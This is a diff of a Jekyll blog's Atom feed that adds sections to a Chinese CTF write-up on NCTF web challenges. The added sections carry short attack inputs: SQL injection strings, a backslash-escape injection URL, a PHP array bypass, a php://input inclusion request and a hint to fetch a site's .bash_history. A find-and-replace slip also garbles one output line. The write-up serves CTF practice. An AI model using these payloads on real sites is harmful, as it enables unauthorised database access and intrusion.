@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-08-18T16:34:52+08:00</updated><id>http://localhost:4000/</id><title type="html">Evil</title><subtitle>Catcher's blog</subtitle><author><name>Catcher</name></author><entry><title type="html">sqlmap系列(一)</title><link href="http://localhost:4000/2018/08/17/slmap1/" rel="alternate" type="text/html" title="sqlmap系列(一)" /><published>2018-08-17T00:00:00+08:00</published><updated>2018-08-17T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/17/slmap1</id><content type="html" xml:base="http://localhost:4000/2018/08/17/slmap1/">&lt;p&gt;抛开场景来谈应用都是在瞎扯，在这里我就打算记录一下各个场景下 sqlmap 的使用。&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-08-18T22:21:51+08:00</updated><id>http://localhost:4000/</id><title type="html">Evil</title><subtitle>Catcher's blog</subtitle><author><name>Catcher</name></author><entry><title type="html">sqlmap系列(一)</title><link href="http://localhost:4000/2018/08/17/slmap1/" rel="alternate" type="text/html" title="sqlmap系列(一)" /><published>2018-08-17T00:00:00+08:00</published><updated>2018-08-17T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/17/slmap1</id><content type="html" xml:base="http://localhost:4000/2018/08/17/slmap1/">&lt;p&gt;抛开场景来谈应用都是在瞎扯，在这里我就打算记录一下各个场景下 sqlmap 的使用。&lt;/p&gt;
 
 &lt;!--more--&gt;
 
@@ -310,7 +310,7 @@ IIS 6 曾经出过的漏洞，处理文件父文件夹如为&lt;code class=&quot
 
 &lt;h2 id=&quot;11download&quot;&gt;11.Download~!&lt;/h2&gt;
 
-&lt;p&gt;&amp;lt;font color=red&amp;gt;貌似是题目坏掉了，题目无法访问&amp;lt;/font&amp;gt;&lt;/p&gt;
+&lt;font color=&quot;red&quot;&gt;貌似是题目坏掉了，题目无法访问&lt;/font&gt;
 
 &lt;h2 id=&quot;12cookie&quot;&gt;12.COOKIE&lt;/h2&gt;
 
@@ -349,7 +349,7 @@ IIS 6 曾经出过的漏洞，处理文件父文件夹如为&lt;code class=&quot
 
 &lt;h2 id=&quot;18php是世界上最好的语言&quot;&gt;18.PHP是世界上最好的语言&lt;/h2&gt;
 
-&lt;p&gt;&amp;lt;font color=red&amp;gt;貌似是题目坏掉了，题目无法访问&amp;lt;/font&amp;gt;&lt;/p&gt;
+&lt;font color=&quot;red&quot;&gt;貌似是题目坏掉了，题目无法访问&lt;/font&gt;
 
 &lt;h2 id=&quot;19伪装者&quot;&gt;19.伪装者&lt;/h2&gt;
 
@@ -359,7 +359,7 @@ IIS 6 曾经出过的漏洞，处理文件父文件夹如为&lt;code class=&quot
 
 &lt;h2 id=&quot;20header&quot;&gt;20.Header&lt;/h2&gt;
 
-&lt;p&gt;&amp;lt;font color=red&amp;gt;貌似是题目坏掉了，题目无法访问&amp;lt;/font&amp;gt;&lt;/p&gt;
+&lt;font color=&quot;red&quot;&gt; 貌似是题目坏掉了，题目无法访问&lt;/font&gt;
 
 &lt;h2 id=&quot;21上传绕过&quot;&gt;21.上传绕过&lt;/h2&gt;
 
@@ -391,7 +391,7 @@ Content-Type: text/php
     [0] =&amp;gt; .jpg
     [1] =&amp;gt; jpg
 )
-Upload: shell.jpg&amp;lt;br /&amp;gt;Type: text/php&amp;lt;br /&amp;gt;Size: 0.2861328125 Kb&amp;lt;br /&amp;gt;Stored in: ./uploads/8a9e5f6a7a789acb.phparray(4) {
+Upload: shell.jpg&amp;lt;br /&amp;gt;Type: text/php&amp;lt;br /&amp;gt;Size: 0.2861328125 Kb&amp;lt;br /&amp;gt;Sto&quot;red&quot; in: ./uploads/8a9e5f6a7a789acb.phparray(4) {
   [&quot;dirname&quot;]=&amp;gt;
   string(9) &quot;./uploads&quot;
   [&quot;basename&quot;]=&amp;gt;
@@ -413,7 +413,7 @@ Upload: shell.jpg&amp;lt;br /&amp;gt;Type: text/php&amp;lt;br /&amp;gt;Size: 0.2
     [0] =&amp;gt; .jpg
     [1] =&amp;gt; jpg
 )
-Upload: shell.jpg&amp;lt;br /&amp;gt;Type: text/php&amp;lt;br /&amp;gt;Size: 0.2861328125 Kb&amp;lt;br /&amp;gt;Stored in: ./uploads/8a9e5f6a7a789acb.phparray(4) {
+Upload: shell.jpg&amp;lt;br /&amp;gt;Type: text/php&amp;lt;br /&amp;gt;Size: 0.2861328125 Kb&amp;lt;br /&amp;gt;Sto&quot;red&quot; in: ./uploads/8a9e5f6a7a789acb.phparray(4) {
   [&quot;dirname&quot;]=&amp;gt;
   string(9) &quot;./uploads&quot;
   [&quot;basename&quot;]=&amp;gt;
@@ -426,7 +426,75 @@ Upload: shell.jpg&amp;lt;br /&amp;gt;Type: text/php&amp;lt;br /&amp;gt;Size: 0.2
 &amp;lt;br&amp;gt;恭喜你获得flag一枚：&amp;lt;br&amp;gt;flag:nctf{welcome_to_hacks_world}
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;通过回显内容的对比可以看到，这里截断就是要截断&lt;code class=&quot;highlighter-rouge&quot;&gt;test.phpshell.jpg&lt;/code&gt;从而绕过后台的验证。&lt;/p&gt;</content><author><name>Catcher</name></author><category term="CTF" /><summary type="html">这篇是南邮 CTF web 题目的 writeup，写在这里作为记录。持续更新……</summary></entry><entry><title type="html">never give up(Bugku)</title><link href="http://localhost:4000/2018/08/13/bk_ng/" rel="alternate" type="text/html" title="never give up(Bugku)" /><published>2018-08-13T00:00:00+08:00</published><updated>2018-08-13T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/13/bk_ng</id><content type="html" xml:base="http://localhost:4000/2018/08/13/bk_ng/">&lt;p&gt;Bugku 上一道比较简单的 web 题目，但是仍然有单独拿出来看看的价值。&lt;/p&gt;
+&lt;p&gt;通过回显内容的对比可以看到，这里截断就是要截断&lt;code class=&quot;highlighter-rouge&quot;&gt;test.phpshell.jpg&lt;/code&gt;从而绕过后台的验证。&lt;/p&gt;
+
+&lt;h2 id=&quot;22sql注入1&quot;&gt;22.SQL注入1&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user=admin')#&amp;amp;pass=1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;23pass-check&quot;&gt;23.pass check&lt;/h2&gt;
+
+&lt;p&gt;POST: &lt;code class=&quot;highlighter-rouge&quot;&gt;pass[]=1&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;24起名字真难&quot;&gt;24.起名字真难&lt;/h2&gt;
+
+&lt;p&gt;PHP 中弱类型比较&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0xccccccccc
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;25密码重置&quot;&gt;25.密码重置&lt;/h2&gt;
+
+&lt;font color=&quot;red&quot;&gt;貌似是题目坏掉了，题目无法访问&lt;/font&gt;
+
+&lt;h2 id=&quot;26php-反序列化暂时无法做&quot;&gt;26.php 反序列化(暂时无法做)&lt;/h2&gt;
+
+&lt;p&gt;暂时无法做&lt;/p&gt;
+
+&lt;h2 id=&quot;27sql-injection&quot;&gt;27.SQL Injection&lt;/h2&gt;
+
+&lt;p&gt;发现sql查选语句使用了分号，对于此种类型的sql注入就必须要闭合其中的分号。由于使用了htmlentities()函数，所以无法使用分号了。此时就可以使用反斜杠来通过转义的方式来吞掉一个分号。注入的payload为：&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://chinalover.sinaapp.com/web15/index.php?username=admin\&amp;amp;password= or 1%23
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;那么最后的查询语句就会变为：&lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT * FROM users WHERE name='admin\'AND pass=' or 1#'&lt;/code&gt;这样就得到了flag了。 遇到了带有引号的sql查选，就是要逃脱单引号，要么就是生成一个单引号，要么就是省略掉一个单引号。在本题中由于没有屏蔽反斜线，就可以使用反斜线来去掉一个单引号。&lt;/p&gt;
+
+&lt;h2 id=&quot;28综合题&quot;&gt;28.综合题&lt;/h2&gt;
+
+&lt;p&gt;JSFuck&lt;br /&gt;
+tip: history of bash&lt;br /&gt;
+bash 的历史记录存放在 .bash_histroy 这个隐藏文件里，访问  &lt;code class=&quot;highlighter-rouge&quot;&gt;http://.../.bash_histroy&lt;/code&gt;。再下载对应文件即可。&lt;/p&gt;
+
+&lt;h2 id=&quot;29system暂时无法做&quot;&gt;29.system（暂时无法做）&lt;/h2&gt;
+
+&lt;p&gt;暂时无法做&lt;/p&gt;
+
+&lt;h2 id=&quot;30sql注入2&quot;&gt;30.SQL注入2&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user=' union select md5(1)#&amp;amp;pass=1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;31综合题2&quot;&gt;31.综合题2&lt;/h2&gt;
+
+&lt;h2 id=&quot;32密码重置2&quot;&gt;32.密码重置2&lt;/h2&gt;
+
+&lt;font color=&quot;red&quot;&gt;貌似是题目坏掉了，题目无法访问&lt;/font&gt;
+
+&lt;h2 id=&quot;33file_get_contents&quot;&gt;33.file_get_contents&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /web23/?file=php://input HTTP/1.1
+
+meizijiu
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;34变量覆盖&quot;&gt;34.变量覆盖&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /web24/?name=meizijiu233 HTTP/1.1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;35hateit&quot;&gt;35.HateIT&lt;/h2&gt;
+
+&lt;h2 id=&quot;36anonymous&quot;&gt;36.Anonymous&lt;/h2&gt;</content><author><name>Catcher</name></author><category term="CTF" /><summary type="html">这篇是南邮 CTF web 题目的 writeup，写在这里作为记录。持续更新……</summary></entry><entry><title type="html">never give up(Bugku)</title><link href="http://localhost:4000/2018/08/13/bk_ng/" rel="alternate" type="text/html" title="never give up(Bugku)" /><published>2018-08-13T00:00:00+08:00</published><updated>2018-08-13T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/13/bk_ng</id><content type="html" xml:base="http://localhost:4000/2018/08/13/bk_ng/">&lt;p&gt;Bugku 上一道比较简单的 web 题目，但是仍然有单独拿出来看看的价值。&lt;/p&gt;
 
 &lt;!--more--&gt;
 
